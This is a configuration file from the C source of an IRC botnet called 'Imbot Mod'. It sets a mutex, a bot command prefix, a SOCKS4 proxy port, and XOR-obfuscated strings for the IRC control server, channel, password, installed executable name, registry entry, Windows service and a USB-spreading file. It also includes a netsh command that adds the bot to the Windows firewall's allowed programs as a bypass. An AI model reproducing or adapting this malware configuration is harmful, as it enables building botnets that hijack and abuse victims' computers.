/*
 ___    _____  __________          __  
|   |  /     \ \______   \  ____ _/  __
|   | /  \ /  \ |    |  _/ /  _ \\   __\
|   |/    Y    \|    |   \(  <_> )|  |
|___|\____|__  /|______  / \____/ |__|
             \/        \/
Imbot Mod - A c&p bot made by h1t3m and modified by Damming
*/

//Mutex
char xetumhandle[]		= "4y6t8mUt1l"; 

//Bot id
char bid[]			    = "PID";    
  
//Command prefix  
char prefix				= '.';          


//Socks4 Port
unsigned short sock4port= 3396;


//XOR settings
char password[] = "\x97\x86\x90\x97";
char authhost1[] = "\xC9\xC2\xC9\xA3\xC9";
char exename[] = "\x97\x86\x90\x97\xCD\x86\x9B\x86";
char szRegname[] = "\x97\x86\x90\x97";
char gotopth[] = "\xC6\x94\x8A\x8D\x87\x8A\x91\xC6";
char infochan[] = "\xC0\x97\x86\x90\x97";
char rarexe[] = "\xA0\x91\x82\x80\x88\xCD\x86\x9B\x86";
char usbfname[] = "\x96\x90\x81\xBC\x87\x91\x8A\x95\x86\x91\xCD\x80\x8C\x8E";


//XOR server settings
SERVER sinfo[]=
{
	{ 
	//"server","pass",6667,"channel","channelpass","-ix"
	"\xD2\xD1\xD4\xCD\xD3\xCD\xD3\xCD\xD2",
	"\x97\x86\x90\x97",
    6667,
	"\xC0\x97\x86\x90\x97",
	"\x97\x86\x90\x97",
	"\xCE\x8A\x9B",
	},
};

//XOR service settings
#ifndef NO_SERVICE
char servicename[] = "\x97\x86\x90\x97";
char servicedisplayname[] = "\x97\x86\x90\x97";
char servicedesc[] = "\x97\x86\x90\x97";
#endif

//Don't change this! (Vista fwb)
char fbyp[]				= "netsh firewall add allowedprogram 1.exe 1 ENABLE";

//Don't change this!
char *authost[] 		= { Decode(authhost1) }; 
 

